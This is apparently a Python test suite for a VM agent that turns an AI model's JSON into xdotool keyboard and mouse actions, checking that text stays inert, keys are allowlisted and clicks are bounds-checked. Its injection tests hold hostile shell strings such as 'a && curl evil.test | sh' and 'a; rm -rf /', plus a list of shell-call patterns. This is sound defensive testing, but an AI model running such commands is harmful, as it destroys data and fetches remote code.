"""The real input layer: what a model's JSON can and cannot turn into on the VM.

These tests import the agent and replace ``_xdotool`` with a recorder.  Nothing
here talks to a display or runs a real command, but the code under test is the
code that would: the same functions the ``/computer/*`` routes call, building the
same argv.  That is the only way to prove the boundary holds without a Codespace,
and it is the boundary that matters -- everything above it reasons about JSON,
and this is where a string could in principle become a command line.
"""

from __future__ import annotations

import sys
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "vm_agent"))

import daemon  # noqa: E402


class RecordingXdotool:
    """Stands in for the one function the input paths are allowed to call."""

    def __init__(self) -> None:
        self.calls: list[list[str]] = []
        self.returncode = 0
        self.stderr = ""

    def __call__(self, *args: str, timeout: int = 10):
        self.calls.append(list(args))
        result = subprocess_Result(self.returncode, self.stderr)
        return result

    @property
    def argv(self) -> list[str]:
        """The last call that changed something.

        Not simply the last call: the geometry and pointer readbacks are also
        calls to xdotool, and a test that asserted on the last one would be
        asserting on a read while believing it was checking an action.
        """
        reads = {"getdisplaygeometry", "getmouselocation", "getwindowundercursor"}
        for call in reversed(self.calls):
            if call and call[0] not in reads:
                return call
        return self.calls[-1] if self.calls else []

    @property
    def invoked(self) -> bool:
        return bool(self.calls)


class subprocess_Result:  # noqa: N801 - a stand-in named for what it replaces
    """Just the three attributes the input paths read off a completed call.

    `stdout` matters as much as the return code: the geometry and pointer
    readbacks parse it, and a stand-in without it would let those paths be
    exercised only in their failure branch.
    """

    def __init__(self, returncode: int = 0, stderr: str = "", stdout: bytes = b"") -> None:
        self.returncode = returncode
        self.stderr = stderr
        self.stdout = stdout


class XdotoolTestCase(unittest.TestCase):
    def setUp(self) -> None:
        self.recorder = RecordingXdotool()
        self._real_xdotool = daemon._xdotool
        self._real_running = daemon._x_running
        self._real_geometry = daemon._display_geometry
        self._real_pointer = daemon._pointer_position
        self._real_focus = daemon._focus_window_under_cursor
        daemon._xdotool = self.recorder
        daemon._x_running = lambda: True

    def tearDown(self) -> None:
        daemon._xdotool = self._real_xdotool
        daemon._x_running = self._real_running
        # Several tests steer the geometry, the pointer readback and the focus
        # step.  They are module-level functions, so without this a substituted
        # one would outlive its test and quietly change the next one's answer --
        # which is how a real disagreement between two layers stayed invisible.
        daemon._display_geometry = self._real_geometry
        daemon._pointer_position = self._real_pointer
        daemon._focus_window_under_cursor = self._real_focus
        # The geometry cache is module level and keyed on the display, so a
        # value installed by one test would otherwise be handed to the next.
        daemon._reset_display_geometry_cache()


class TestTheScreenshotIsMeasuredNotAssumed(XdotoolTestCase):
    """The size sent to the model must be the size of the bytes it is sent.

    The loop tells the model "these pixels are your coordinate system".  If the
    reported size is a setting rather than a measurement, a capture that comes
    back at a different size produces clicks that are wrong by a ratio, and
    nothing in the run looks wrong -- the model is only ever wrong.
    """

    @staticmethod
    def jpeg(width: int, height: int) -> bytes:
        """A byte string with a real SOF0 frame header at the given size.

        Only the header is built.  `_jpeg_size` reads the marker and never
        decodes, so a synthetic header is enough to pin the parsing and keeps
        the test from depending on an encoder being installed.
        """
        sof = b"\xff\xc0" + (17).to_bytes(2, "big") + b"\x08" + \
            height.to_bytes(2, "big") + width.to_bytes(2, "big") + b"\x03" + b"\x01\x11\x00\x02\x11\x01\x03\x11\x01"
        return b"\xff\xd8\xff\xe0" + (16).to_bytes(2, "big") + b"JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00" + sof + b"\xff\xd9"

    def test_the_size_is_read_out_of_the_jpeg_itself(self):
        self.assertEqual(daemon._jpeg_size(self.jpeg(1365, 768)), (1365, 768))
        self.assertEqual(daemon._jpeg_size(self.jpeg(1280, 1024)), (1280, 1024))

    def test_its_own_sof_is_found_past_a_dht_marker(self):
        # A real JPEG puts a Huffman table (0xFFC4) before the frame header, and
        # 0xFFC4 sits inside the SOF0..SOF15 range.  A parser that treated any
        # marker in that range as a frame header would read 0x0000 as the size.
        data = self.jpeg(800, 600)
        dht = b"\xff\xc4" + (18).to_bytes(2, "big") + b"\x00" + b"\x10" * 16
        self.assertEqual(daemon._jpeg_size(data[:2] + dht + data[2:]), (800, 600))

    def test_rubbish_is_reported_as_unknown_rather_than_guessed(self):
        # Zero means "could not tell", and the caller falls back to the display
        # geometry.  Guessing here would reintroduce the exact bug this class
        # exists to prevent.
        for data in (b"", b"not a jpeg", b"\xff\xd8", b"\x00" * 40):
            with self.subTest(data=data[:8]):
                self.assertEqual(daemon._jpeg_size(data), (0, 0))

    def _capture(self, jpeg_bytes: bytes) -> dict:
        import subprocess as sp

        real_run = sp.run
        sp.run = lambda *a, **k: sp.CompletedProcess(a[0] if a else [], 0, stdout=jpeg_bytes, stderr=b"")
        try:
            return daemon._capture_display()
        finally:
            sp.run = real_run

    def test_the_reported_size_is_the_size_of_the_image_that_was_captured(self):
        daemon._display_geometry = lambda: (1365, 768)
        result = self._capture(self.jpeg(1280, 720))
        self.assertTrue(result["ok"], result.get("error"))
        # The image wins over the display: it is what the model is looking at.
        self.assertEqual((result["width"], result["height"]), (1280, 720))
        self.assertFalse(
            result.get("geometry_matches"),
            "a capture that does not match the display must say so",
        )

    def test_a_matching_capture_is_reported_as_matching(self):
        daemon._display_geometry = lambda: (1365, 768)
        result = self._capture(self.jpeg(1365, 768))
        self.assertEqual((result["width"], result["height"]), (1365, 768))
        self.assertTrue(result.get("geometry_matches"))

    def test_the_mouse_is_drawn_into_the_screenshot_the_model_sees(self):
        # Without the pointer in the image the model is being asked to aim at a
        # target using a screenshot taken with no idea where it last clicked.
        import subprocess as sp

        seen = {}
        real_run = sp.run

        def spy(cmd, **kwargs):
            seen["cmd"] = cmd
            return sp.CompletedProcess(cmd, 0, stdout=self.jpeg(1365, 768), stderr=b"")

        sp.run = spy
        try:
            daemon._capture_display(draw_mouse=True)
        finally:
            sp.run = real_run
        self.assertIn("-draw_mouse", seen["cmd"])
        self.assertEqual(seen["cmd"][seen["cmd"].index("-draw_mouse") + 1], "1")


class TestKeyboardFocusFollowsThePointer(XdotoolTestCase):
    """Keystrokes go to whatever has input focus, not to whatever is on top.

    A click sets focus through the window manager, but not when it lands on a
    part of the page that is not focusable, and not at all on the first action of
    a run.  Typing then goes somewhere else and appears to do nothing, which is
    reported as "keyboard control is broken".
    """

    def setUp(self):
        super().setUp()
        # The real focus function runs here, answering with a window id, so the
        # whole activation path is exercised rather than stubbed away.
        self.window_id = "29360134"
        inner = self.recorder
        self.focus_calls = 0

        def answering(*args, **kwargs):
            self.focus_calls += 1
            if args[:1] == ("getwindowundercursor",):
                return subprocess_Result(stdout=f"{self.window_id}\n".encode())
            return inner(*args, **kwargs)

        daemon._xdotool = answering

    def test_typing_activates_the_window_under_the_cursor_first(self):
        self.recorder.calls.clear()
        result = daemon._computer_type("hello")
        self.assertTrue(result["ok"], result.get("error"))
        kinds = [c[0] for c in self.recorder.calls]
        self.assertIn("windowactivate", kinds, "the focus step was skipped")
        self.assertIn("type", kinds)
        # The focus has to come before the keystrokes, not after.
        self.assertLess(
            max(i for i, c in enumerate(kinds) if c.startswith("window")),
            kinds.index("type"),
        )
        self.assertIn(
            ["windowactivate", "--sync", self.window_id],
            self.recorder.calls,
            "focus must be raised with --sync, or the keystrokes race it",
        )

    def test_a_key_press_also_takes_focus_first(self):
        self.recorder.calls.clear()
        result = daemon._computer_key("ENTER")
        self.assertTrue(result["ok"], result.get("error"))
        kinds = [c[0] for c in self.recorder.calls]
        self.assertLess(
            max(i for i, c in enumerate(kinds) if c.startswith("window")),
            kinds.index("key"),
        )

    def test_focus_is_still_attempted_when_there_is_no_window_manager(self):
        # A refused focus must not become a refused keystroke.  The model cannot
        # tell whether X has a WM, so it cannot compensate, and the run would
        # stall on the first thing it tried to type.
        def no_window(*args, **kwargs):
            if args[:1] in (("getwindowundercursor",), ("windowactivate",), ("windowfocus",)):
                return subprocess_Result(returncode=1, stderr=b"no such window")
            return self.recorder(*args, **kwargs)

        daemon._xdotool = no_window
        self.recorder.calls.clear()
        result = daemon._computer_type("hello")
        self.assertTrue(result["ok"], result.get("error"))
        self.assertIn("type", [c[0] for c in self.recorder.calls])


class TestTheRealDisplayGeometryIsMeasured(XdotoolTestCase):
    """The configured size is a request, not a fact.

    DESKTOP_SIZE says what Xvfb was asked for.  The number that decides whether
    a click lands is the size X actually came up with, and a mismatch between
    the two is a silent 1.1x error on every coordinate the model produces.
    """

    def setUp(self) -> None:
        super().setUp()
        self.geometry = "1365 768"
        inner = self.recorder
        self.probes = 0

        def answering(*args, **kwargs):
            if args[:1] == ("getdisplaygeometry",):
                self.probes += 1
                return subprocess_Result(stdout=f"{self.geometry}\n".encode())
            return inner(*args, **kwargs)

        daemon._xdotool = answering

    def _reset(self) -> None:
        daemon._reset_display_geometry_cache()

    def test_the_size_is_read_from_the_display_not_the_settings(self):
        self.geometry = "1280 1024"
        self._reset()
        self.assertEqual((daemon._desktop_width(), daemon._desktop_height()), (1280, 1024))

    def test_the_settings_are_the_fallback_when_the_query_fails(self):
        # X can be up but refuse the query.  Falling back to the configured size
        # is wrong on a real mismatch and right on a real match, so it is only
        # used when nothing better is available.
        def failing(*args, **kwargs):
            if args[:1] == ("getdisplaygeometry",):
                return subprocess_Result(returncode=1, stderr=b"no such option")
            return inner(*args, **kwargs)

        daemon._xdotool = failing
        self._reset()
        width, height = (int(p) for p in daemon.DESKTOP_SIZE.split("x"))
        self.assertEqual((daemon._desktop_width(), daemon._desktop_height()), (width, height))

    def test_the_geometry_is_asked_for_once_not_once_per_coordinate(self):
        # It cannot change under us -- the display is fixed for the life of the
        # X server, and an Xvfb restart resets the cache explicitly.
        self.geometry = "1365 768"
        self._reset()
        self.probes = 0
        for _ in range(5):
            daemon._desktop_width()
            daemon._desktop_height()
        self.assertEqual(self.probes, 1, "the display was re-probed for one lookup")


class TestTypeReachesTheKeyboard(XdotoolTestCase):
    def test_text_is_typed(self):
        result = daemon._computer_type("hello world")
        self.assertTrue(result["ok"], result.get("error"))
        self.assertEqual(self.recorder.argv[0], "type")
        self.assertIn("hello world", self.recorder.argv)

    def test_text_is_one_argument_behind_a_double_dash(self):
        # The whole point: a model cannot smuggle an xdotool option through the
        # text field, because the text is never in a position to be one.
        daemon._computer_type("--sync click 3")
        argv = self.recorder.argv
        self.assertEqual(argv[-1], "--sync click 3")
        self.assertIn("--", argv)
        self.assertLess(argv.index("--"), len(argv) - 1)
        # Exactly one occurrence of the text, and it is the final argument.
        self.assertEqual(argv.count("--sync click 3"), 1)

    def test_shell_metacharacters_are_inert(self):
        for text in (
            "a; rm -rf /",
            "$(id)",
            "`whoami`",
            "a && curl evil.test | sh",
            "> /etc/passwd",
            "a\nb",
            "'quoted' \"double\"",
        ):
            with self.subTest(text=text):
                self.recorder.calls.clear()
                result = daemon._computer_type(text)
                self.assertTrue(result["ok"], result.get("error"))
                # Present verbatim, as exactly one argument, and nothing else
                # was added to the command line around it.
                self.assertEqual(self.recorder.argv[-1], text)
                self.assertEqual(len(self.recorder.argv), 6)

    def test_a_leading_dash_is_typed_not_read_as_an_option(self):
        daemon._computer_type("-e /bin/sh")
        self.assertEqual(self.recorder.argv[-1], "-e /bin/sh")

    def test_typing_is_bounded(self):
        self.recorder.calls.clear()
        result = daemon._computer_type("x" * 2001)
        self.assertFalse(result["ok"])
        self.assertFalse(self.recorder.invoked, "nothing may be typed when refused")

    def test_empty_and_nul_are_refused_before_typing(self):
        for text in ("", "a\x00b"):
            with self.subTest(text=repr(text)):
                self.recorder.calls.clear()
                result = daemon._computer_type(text)
                self.assertFalse(result["ok"])
                self.assertFalse(self.recorder.invoked)

    def test_a_failing_xdotool_is_reported_not_swallowed(self):
        self.recorder.returncode = 1
        self.recorder.stderr = "no such key"
        result = daemon._computer_type("hi")
        self.assertFalse(result["ok"])
        self.assertIn("no such key", result["error"])

    def test_no_display_is_refused(self):
        daemon._x_running = lambda: False
        for call in (
            lambda: daemon._computer_type("hi"),
            lambda: daemon._computer_key("ENTER"),
            lambda: daemon._computer_scroll(100),
            lambda: daemon._computer_move(1, 1),
        ):
            with self.subTest(call=call):
                self.recorder.calls.clear()
                result = call()
                self.assertFalse(result["ok"])
                self.assertIn("X display", result["error"])
                self.assertFalse(self.recorder.invoked)


class TestKeyAllowlist(XdotoolTestCase):
    def test_the_keys_from_the_brief(self):
        for name, expected in (
            ("ENTER", "Return"),
            ("TAB", "Tab"),
            ("ESC", "Escape"),
            ("BACKSPACE", "BackSpace"),
            ("CTRL+L", "ctrl+l"),
            ("CTRL+A", "ctrl+a"),
        ):
            with self.subTest(key=name):
                self.recorder.calls.clear()
                result = daemon._computer_key(name)
                self.assertTrue(result["ok"], result.get("error"))
                self.assertEqual(self.recorder.argv[-1], expected)

    def test_the_two_tables_are_the_only_source_of_a_keysym(self):
        # Every accepted name maps into one of the two tables, so the xdotool
        # argument is assembled from a fixed set and never from model text.
        for name in list(daemon._COMPUTER_KEYSYMS) + ["CTRL+" + k for k in "ABCDEFGHIJ"]:
            with self.subTest(key=name):
                self.recorder.calls.clear()
                result = daemon._computer_key(name)
                self.assertTrue(result["ok"], result.get("error"))
                combo = self.recorder.argv[-1]
                mods, _, base = combo.rpartition("+")
                for mod in filter(None, mods.split("+")):
                    self.assertIn(mod, set(daemon._COMPUTER_MODIFIERS.values()))
                if base not in daemon._COMPUTER_SINGLE:
                    self.assertIn(base, set(daemon._COMPUTER_KEYSYMS.values()))

    def test_a_name_that_is_not_a_key_is_refused(self):
        for name in (
            "F13",
            ";id",
            "ENTER;id",
            "CTRL+;id",
            "Enter;id",
            "return;id",
            "",
            "   ",
            "a b",
            "CTRL+ALT+SHIFT+ENTER",
            "CTRL+ENTER+X",
            "a+b",
            "grave",
        ):
            with self.subTest(key=name):
                self.recorder.calls.clear()
                result = daemon._computer_key(name)
                self.assertFalse(result["ok"], f"{name!r} was accepted")
                self.assertFalse(self.recorder.invoked, f"{name!r} reached xdotool")

    def test_every_modifier_is_allowed_with_an_allowed_key(self):
        # SUPER/META is in the modifier table, so super+x is a legitimate
        # request and is resolved rather than refused.
        for combo in ("super+x", "meta+a", "ALT+F4", "shift+tab"):
            with self.subTest(key=combo):
                self.recorder.calls.clear()
                result = daemon._computer_key(combo)
                self.assertTrue(result["ok"], result.get("error"))
                self.assertNotIn("SUPER", self.recorder.argv[-1])

    def test_injection_attempts_never_reach_xdotool(self):
        for name in (
            "Return; touch /tmp/pwned",
            "ctrl+grave",
            "ctrl+shift+grave",
            "$(id)",
            "Return\nReturn",
            "key Return",
            "ctrl+l+Return",
        ):
            with self.subTest(key=name):
                self.recorder.calls.clear()
                result = daemon._computer_key(name)
                self.assertFalse(result["ok"], f"{name!r} was accepted")
                self.assertFalse(self.recorder.invoked)

    def test_hyphens_and_case_are_normalised(self):
        for name in ("enter", "Enter", "ENTER", " ctrl+l ", "CTRL-L", "ctrl-L"):
            with self.subTest(key=name):
                self.recorder.calls.clear()
                result = daemon._computer_key(name)
                self.assertTrue(result["ok"], result.get("error"))
                self.assertIn(self.recorder.argv[-1], ("Return", "ctrl+l"))

    def test_a_duplicate_modifier_collapses(self):
        daemon._computer_key("CTRL+CONTROL+A")
        self.assertEqual(self.recorder.argv[-1], "ctrl+a")

    def test_the_refusal_names_what_is_allowed(self):
        result = daemon._computer_key("F13")
        self.assertFalse(result["ok"])
        self.assertIn("ENTER", result["error"])
        self.assertIn("CTRL", result["error"])


class TestScrollUsesWheelButtons(XdotoolTestCase):
    def test_down_presses_button_five(self):
        result = daemon._computer_scroll(600)
        self.assertTrue(result["ok"], result.get("error"))
        self.assertEqual(self.recorder.argv[0], "click")
        self.assertEqual(self.recorder.argv[-1], "5")

    def test_up_presses_button_four(self):
        daemon._computer_scroll(-600)
        self.assertEqual(self.recorder.argv[-1], "4")

    def test_the_button_is_never_taken_from_the_request(self):
        # Only these two buttons exist in this code path at all.
        for delta in (600, -600, 1, -1, 5000, -5000):
            with self.subTest(delta=delta):
                self.recorder.calls.clear()
                daemon._computer_scroll(delta)
                self.assertIn(self.recorder.argv[-1], ("4", "5"))

    def test_zero_and_out_of_range_are_refused(self):
        for delta in (0, 5001, -5001, 100000, -100000):
            with self.subTest(delta=delta):
                self.recorder.calls.clear()
                result = daemon._computer_scroll(delta)
                self.assertFalse(result["ok"], str(delta))
                self.assertFalse(self.recorder.invoked)

    def test_notches_are_bounded(self):
        daemon._computer_scroll(5000)
        steps = int(self.recorder.argv[self.recorder.argv.index("--repeat") + 1])
        self.assertLessEqual(steps, daemon._COMPUTER_SCROLL_MAX_STEPS)


class TestMoveDoesNotClick(XdotoolTestCase):
    def test_move_only_moves(self):
        result = daemon._computer_move(700, 450)
        self.assertTrue(result["ok"], result.get("error"))
        # The move is followed by a readback of where the pointer actually is.
        # Only the mutation itself is asserted here: the point is that no button
        # is pressed, and "click" appearing nowhere in *any* call is what proves
        # that.
        self.assertEqual(self.recorder.argv, ["mousemove", "--sync", "700", "450"])
        # "click" appears nowhere, so a move cannot have clicked.
        for call in self.recorder.calls:
            self.assertNotIn("click", call, f"a move pressed a button: {call}")

    def test_a_move_reports_the_pointer_position_it_reached(self):
        # Moving the cursor is how a model lines itself up before pressing a
        # key, so the reply has to say where the pointer ended up rather than
        # only what was asked for.
        daemon._pointer_position = lambda: (700, 450)
        self.recorder.calls.clear()
        result = daemon._computer_move(700, 450)
        self.assertEqual((result["actual_x"], result["actual_y"]), (700, 450))
        self.assertTrue(result["landed"])


class TestTheTwoAllowlistsAgree(XdotoolTestCase):
    """The app and the agent are separate deployables with separate tables.

    The agent is the one that touches the machine and its copy is what
    ultimately decides, but if the app accepted a key the agent refuses, every
    use of it would be a wasted turn and a confusing message to the model. So
    they are asserted to be the same set.
    """

    def test_the_app_and_the_agent_allow_exactly_the_same_keys(self):
        sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
        from app.computer.commands import KEY_ALLOWLIST, MODIFIER_ALLOWLIST

        self.assertEqual(set(KEY_ALLOWLIST), set(daemon._COMPUTER_KEYSYMS))
        self.assertEqual(set(MODIFIER_ALLOWLIST), set(daemon._COMPUTER_MODIFIERS))
        for name, keysym in KEY_ALLOWLIST.items():
            self.assertEqual(
                daemon._COMPUTER_KEYSYMS[name], keysym,
                f"{name} resolves differently in the two places",
            )

    def test_every_shared_key_is_accepted_by_both(self):
        sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
        from app.computer.commands import normalize_key

        for name in daemon._COMPUTER_KEYSYMS:
            with self.subTest(key=name):
                combo, err = normalize_key(name)
                self.assertEqual(err, "", f"the app refused {name}")
                self.recorder.calls.clear()
                result = daemon._computer_key(combo)
                self.assertTrue(result["ok"], result.get("error"))


class TestRoutesAreNotAShell(unittest.TestCase):
    """No computer-input route may forward a model string into a command line.

    Scoped to the input functions on purpose.  The agent does have a separate
    `/tool/exec` route that legitimately runs a shell, and asserting over the
    whole file would either fail on that or force it to be weakened to satisfy a
    test about the wrong thing.  What matters here is narrower and absolute: the
    paths a model's JSON reaches contain no shell at all.
    """

    INPUT_FUNCTIONS = (
        "_computer_type",
        "_computer_key",
        "_computer_scroll",
        "_computer_move",
        "_computer_click",
        "_xdotool",
    )

    def test_the_input_functions_contain_no_shell(self):
        import inspect

        for name in self.INPUT_FUNCTIONS:
            with self.subTest(fn=name):
                body = inspect.getsource(getattr(daemon, name))
                # Strip the docstring and comments: prose about shells is fine,
                # a shell is not.
                code = "\n".join(
                    line for line in body.splitlines()
                    if not line.strip().startswith("#")
                )
                code = code.split('"""')[-1] if '"""' in code else code
                for pattern in ("shell=True", "os.system", "os.popen", "sh -c"):
                    self.assertNotIn(pattern, code, f"{name} can build a shell")

    def test_xdotool_is_always_given_an_argument_list(self):
        import inspect

        body = inspect.getsource(daemon._xdotool)
        # A list literal, not a joined string: there is no shell to word-split.
        self.assertIn('["xdotool", *args]', body)
        self.assertNotIn("shell=True", body)

    def test_the_input_routes_only_call_the_known_helpers(self):
        import inspect

        body = inspect.getsource(daemon.Handler.do_POST)
        # Everything the model can reach in this handler goes through one of the
        # vetted functions. Named explicitly so a new raw call has to be added
        # here on purpose.
        for name in self.INPUT_FUNCTIONS:
            if name == "_xdotool":
                continue
            self.assertIn(f"{name}(", body, f"{name} is not routed")
        self.assertNotIn("subprocess", body, "the handler must not build commands")
        self.assertNotIn("eval(", body)
        self.assertNotIn("exec(", body)


class TestTheClickItselfRefusesRatherThanClamping(XdotoolTestCase):
    """The refusal has to live in the function, not only in the route.

    The route refuses out-of-bounds coordinates before the function is called,
    so a test that only drives the route cannot tell a refusing click from a
    clamping one -- the route has already turned it away.  Called directly, a
    clamping click would move the real pointer to the edge of the screen and
    report success, which is the worst possible outcome: the run looks fine and
    the browser did something else entirely.
    """

    def setUp(self):
        super().setUp()
        self._real_geometry = daemon._display_geometry
        daemon._display_geometry = lambda: (1365, 768)

    def tearDown(self):
        daemon._display_geometry = self._real_geometry
        super().tearDown()

    def test_a_negative_coordinate_is_refused_and_the_pointer_never_moves(self):
        self.recorder.calls.clear()
        result = daemon._computer_click(-1, 350)
        self.assertFalse(result["ok"])
        self.assertIn("outside", result["error"])
        pressed = [c for c in self.recorder.calls if c[0] in ("mousemove", "click")]
        self.assertEqual(pressed, [], "a refused click still moved the pointer")

    def test_a_coordinate_past_the_edge_is_refused(self):
        for x, y in ((1365, 350), (700, 768), (1365, 768)):
            with self.subTest(x=x, y=y):
                self.recorder.calls.clear()
                result = daemon._computer_click(x, y)
                self.assertFalse(result["ok"], f"({x},{y}) was accepted")
                pressed = [c for c in self.recorder.calls if c[0] in ("mousemove", "click")]
                self.assertEqual(pressed, [], f"({x},{y}) reached the pointer")

    def test_the_refusal_does_not_claim_the_clicked_point(self):
        # A clamping implementation would echo back the clamped coordinate, so
        # the reply must not carry an executed position at all.
        result = daemon._computer_click(99999, 99999)
        self.assertFalse(result["ok"])
        self.assertIsNone(result.get("x"))
        self.assertIsNone(result.get("y"))

    def test_the_last_in_bounds_pixel_is_accepted(self):
        # The boundary itself: a check written as `<=` instead of `<` would
        # refuse a legitimate corner click, and the model would have no way to
        # reach the bottom-right of the screen.
        self.recorder.calls.clear()
        result = daemon._computer_click(1364, 767)
        self.assertTrue(result["ok"], result.get("error"))
        self.assertEqual((result["x"], result["y"]), (1364, 767))
        pressed = [c for c in self.recorder.calls if c[0] in ("mousemove", "click")]
        self.assertEqual(pressed, [["mousemove", "--sync", "1364", "767", "click", "1"]])

    def test_a_move_is_refused_on_the_same_boundary(self):
        for x, y in ((-1, 0), (0, -1), (1365, 0), (0, 768)):
            with self.subTest(x=x, y=y):
                self.recorder.calls.clear()
                result = daemon._computer_move(x, y)
                self.assertFalse(result["ok"], f"({x},{y}) was accepted")
                moved = [c for c in self.recorder.calls if c[0] == "mousemove"]
                self.assertEqual(moved, [], f"({x},{y}) reached the pointer")


class TestRoutesOverRealHttp(XdotoolTestCase):
    """Drive the actual ``/computer/*`` routes over a real socket.

    Calling ``_computer_type`` directly proves the function is safe.  It does not
    prove the route is: the handler has its own layer of validation that a direct
    call walks straight past, and that layer is where a wrong type or a missing
    field would turn into a crash instead of a refusal.  So the server is started
    for real on an ephemeral loopback port and the requests go in as bytes.
    """

    def setUp(self):
        super().setUp()
        import threading
        from http.server import ThreadingHTTPServer

        self.server = ThreadingHTTPServer(("127.0.0.1", 0), daemon.Handler)
        self.port = self.server.server_address[1]
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
        self.thread.start()
        # The route and the click action must agree on where the display ends.
        # Both now read `_display_geometry`, and this pins that one seam -- pinning
        # `_desktop_width`/`_desktop_height` would leave the action checking a
        # different number, which is exactly the mismatch that let a refused
        # click through as a 200.  The base class already saved the original.
        daemon._display_geometry = lambda: (1280, 800)

    def tearDown(self):
        daemon._display_geometry = self._real_geometry
        self.server.shutdown()
        self.server.server_close()
        super().tearDown()

    def post(self, path, payload):
        import json
        import urllib.error
        import urllib.request

        body = payload if isinstance(payload, bytes) else json.dumps(payload).encode()
        req = urllib.request.Request(
            f"http://127.0.0.1:{self.port}{path}",
            data=body,
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        try:
            with urllib.request.urlopen(req, timeout=10) as resp:
                return resp.status, json.loads(resp.read().decode())
        except urllib.error.HTTPError as exc:
            return exc.code, json.loads(exc.read().decode())

    def test_each_new_action_round_trips(self):
        for path, payload, expect in (
            ("/computer/type", {"text": "hello world"}, "hello world"),
            ("/computer/key", {"key": "ctrl+l"}, "ctrl+l"),
            ("/computer/scroll", {"delta_y": 300}, "5"),
            ("/computer/scroll", {"delta_y": -300}, "4"),
            ("/computer/move", {"x": 700, "y": 450}, "700"),
        ):
            with self.subTest(path=path, payload=payload):
                self.recorder.calls.clear()
                status, body = self.post(path, payload)
                self.assertEqual(status, 200, body)
                self.assertTrue(body["ok"], body)
                self.assertTrue(self.recorder.calls, f"{path} never called xdotool")
                # The model string arrived intact, as a single argument.  Checked
                # against the action itself, not the last call: a pointer
                # readback now follows every action.
                self.assertIn(expect, self.recorder.argv)

    def test_click_moves_then_presses_in_one_invocation(self):
        # The whole click must be one xdotool call.  Two calls -- mousemove, then
        # click -- leaves a gap between two X round trips, and anything that moves
        # the pointer in that gap puts the button press somewhere the caller never
        # asked for.  This is the most likely reason clicks missed their target.
        self.recorder.calls.clear()
        status, body = self.post("/computer/click", {"x": 700, "y": 350})
        self.assertEqual(status, 200, body)
        self.assertTrue(body["ok"], body)
        # The geometry probe is a read, not part of the click, so the assertion
        # is about the calls that move or press anything.
        self.assertEqual(
            [c for c in self.recorder.calls if c[0] in ("mousemove", "click")],
            [["mousemove", "--sync", "700", "350", "click", "1"]],
            "the move and the press must share one X connection",
        )
        # --sync, or the click is queued against the position the pointer has not
        # reached yet.
        self.assertIn("--sync", self.recorder.argv)

    def test_a_click_reports_where_the_pointer_actually_ended_up(self):
        # The point of the exercise: a click that missed must be visible as a
        # mismatch rather than looking exactly like one that worked.
        daemon._pointer_position = lambda: (702, 348)
        self.recorder.calls.clear()
        result = daemon._computer_click(700, 350)
        self.assertTrue(result["ok"])
        self.assertEqual((result["actual_x"], result["actual_y"]), (702, 348))
        self.assertFalse(result["landed"], "a drifted click must not claim to land")

    def test_a_click_that_lands_says_so(self):
        daemon._pointer_position = lambda: (700, 350)
        self.recorder.calls.clear()
        result = daemon._computer_click(700, 350)
        self.assertTrue(result["landed"])
        self.assertEqual((result["x"], result["y"]), (700, 350))

    def test_a_mismatch_between_the_layers_never_silently_allows_a_click(self):
        # Regression.  The route checked bounds against one source of truth and
        # the action checked them against another, so a point one layer believed
        # was on screen was refused by the other -- and because the refusal came
        # back from inside a 200, it read as a flaky click rather than as the
        # disagreement it was.  Pinned at the two sizes, the two layers must
        # refuse the same points and accept the same ones.
        original = daemon._display_geometry
        try:
            for width, height in ((1280, 800), (1365, 768)):
                with self.subTest(display=f"{width}x{height}"):
                    daemon._display_geometry = lambda w=width, h=height: (w, h)
                    # The last in-bounds point is accepted...
                    status, body = self.post("/computer/click", {"x": width - 1, "y": height - 1})
                    self.assertEqual(status, 200, body)
                    self.assertTrue(body["ok"], body)
                    # ...and the first out-of-bounds point is refused by the
                    # route itself, so it never reaches the pointer at all.
                    self.recorder.calls.clear()
                    status, body = self.post("/computer/click", {"x": width, "y": height - 1})
                    self.assertEqual(status, 400, body)
                    self.assertFalse(body["ok"])
                    pressed = [c for c in self.recorder.calls if c[0] in ("mousemove", "click")]
                    self.assertEqual(pressed, [], "a refused click still moved the pointer")
        finally:
            daemon._display_geometry = original

    def test_a_click_outside_the_real_display_is_refused_not_clamped(self):
        # Refused, never clamped: a clamped click lands on the edge of the screen
        # while carrying the coordinates of something in the middle of it.  The
        # assertion is on calls that move or press, so the read-only geometry
        # probe is not mistaken for a click.
        for x, y in ((-1, 350), (700, -1), (1280, 350), (700, 800), (99999, 99999)):
            with self.subTest(x=x, y=y):
                self.recorder.calls.clear()
                status, body = self.post("/computer/click", {"x": x, "y": y})
                self.assertEqual(status, 400, body)
                self.assertFalse(body["ok"], f"({x},{y}) was accepted")
                pressed = [c for c in self.recorder.calls if c[0] in ("mousemove", "click")]
                self.assertEqual(pressed, [], f"({x},{y}) reached the pointer")

    def test_wrong_types_are_refused_not_crashed(self):
        for path, payload in (
            ("/computer/type", {"text": 42}),
            ("/computer/type", {}),
            ("/computer/key", {"key": ["ENTER"]}),
            ("/computer/key", {}),
            ("/computer/scroll", {"delta_y": "300"}),
            ("/computer/scroll", {"delta_y": True}),
            ("/computer/scroll", {}),
            ("/computer/move", {"x": "seven hundred", "y": 450}),
            ("/computer/move", {"x": None, "y": 450}),
            ("/computer/move", {"x": [700], "y": 450}),
            ("/computer/click", {}),
        ):
            with self.subTest(path=path, payload=payload):
                self.recorder.calls.clear()
                status, body = self.post(path, payload)
                self.assertEqual(status, 400, f"{path} {payload} -> {body}")
                self.assertFalse(body["ok"])
                self.assertFalse(
                    self.recorder.calls, f"{path} acted on a bad request"
                )

    def test_coordinates_given_as_numeric_strings_are_tolerated(self):
        # int() is a total, side-effect-free coercion, so a well-formed number in
        # a string is harmless and worth accepting.  The app-side parser is strict
        # about JSON types, so this tolerance is never the thing standing between
        # the model and xdotool -- it is just not worth crashing over.
        for path, payload in (
            ("/computer/move", {"x": "700", "y": "450"}),
            ("/computer/click", {"x": "10", "y": "20"}),
        ):
            with self.subTest(path=path):
                self.recorder.calls.clear()
                status, body = self.post(path, payload)
                self.assertEqual(status, 200, body)
                self.assertTrue(body["ok"], body)
                self.assertTrue(self.recorder.calls)

    def test_out_of_bounds_is_refused_over_http(self):
        for path, payload in (
            ("/computer/move", {"x": -5, "y": 450}),
            ("/computer/move", {"x": 700, "y": 99999}),
            ("/computer/click", {"x": 1280, "y": 10}),
        ):
            with self.subTest(path=path, payload=payload):
                self.recorder.calls.clear()
                status, body = self.post(path, payload)
